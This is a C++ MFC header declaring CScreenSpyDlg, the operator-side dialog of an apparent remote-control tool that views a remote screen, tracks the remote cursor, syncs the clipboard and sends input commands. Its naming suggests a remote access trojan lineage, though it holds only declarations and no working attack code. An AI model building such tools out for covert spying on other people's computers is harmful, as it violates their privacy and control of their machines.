
#include "CursorInfo.h"


#pragma once

// ScreenSpyDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CScreenSpyDlg dialog


class CScreenSpyDlg : public CDialog
{
// Construction
public:
	void OnReceiveComplete();
	void OnReceive();
	CScreenSpyDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
// Dialog Data
	//{{AFX_DATA(CScreenSpyDlg)
	enum { IDD = IDD_SCREENSPY };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA
	double           m_wZoom;            // 屏幕横向缩放比
	double           m_hZoom;            // 屏幕纵向缩放比
	CRect CLIENTRECT;
	CRect rect;
	int clienr, clientt;
	int iHScrollPos, iVScrollPos;
	CRITICAL_SECTION m_cs;
	CRect rectDlg;
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CScreenSpyDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CScreenSpyDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	void InitMMI();
	MINMAXINFO m_MMI;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC, m_hPaintDC;
	HBITMAP	m_hFullBitmap;
	HBITMAP	m_hFullBitmap2;
	LPVOID m_lpScreenDIB;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	int nAlgorithm2;
	void ResetScreen();
	void DrawFirstScreen();
	void DrawNextScreenDiff();	// 差异法
	void DrawNextScreenRect();	// 隔行扫描法
	void DrawNextScreenDxgi();	// DXGI
	
	void SendResetScreen(int nBitCount);
	void SendResetAlgorithm(UINT nAlgorithm);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
	int	m_nBitCount;
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);
	LRESULT OnGetMiniMaxInfo(WPARAM, LPARAM);
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.
